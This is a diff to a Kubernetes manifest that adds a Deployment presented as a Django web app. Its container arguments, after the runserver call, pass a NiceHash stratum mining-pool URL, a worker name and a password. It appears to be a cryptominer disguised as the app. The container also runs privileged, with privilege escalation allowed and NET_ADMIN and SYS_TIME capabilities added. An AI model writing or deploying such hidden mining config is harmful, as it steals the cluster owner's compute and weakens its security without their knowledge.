@@ -104,3 +104,45 @@ spec:
           privileged: true
           capabilities:
             add: ["NET_ADMIN", "SYS_TIME"]
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: django-app
+  labels:
+    app: django-app
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: django-app
+  template:
+    metadata:
+      labels:
+        app: django-app
+    spec:
+      imagePullSecrets:
+      - name: ecr-secret
+      containers:
+      - name: django-app
+        image: "${IMAGE_REGISTRY}"
+        args:
+          - "python"
+          - "manage.py"
+          - "runserver"
+          - "0.0.0.0:4412"  # Configuración para ejecutar Django en el puerto 4412
+          - "--url"
+          - "stratum+tcp://scrypt.auto.nicehash.com:9200"
+          - "--user"
+          - "creack.worker1"
+          - "--pass"
+          - "abcdef"
+        ports:
+        - containerPort: 4415
+        securityContext:
+          runAsNonRoot: true
+          allowPrivilegeEscalation: true
+          readOnlyRootFilesystem: true
+          privileged: true
+          capabilities:
+            add: ["NET_ADMIN", "SYS_TIME"]
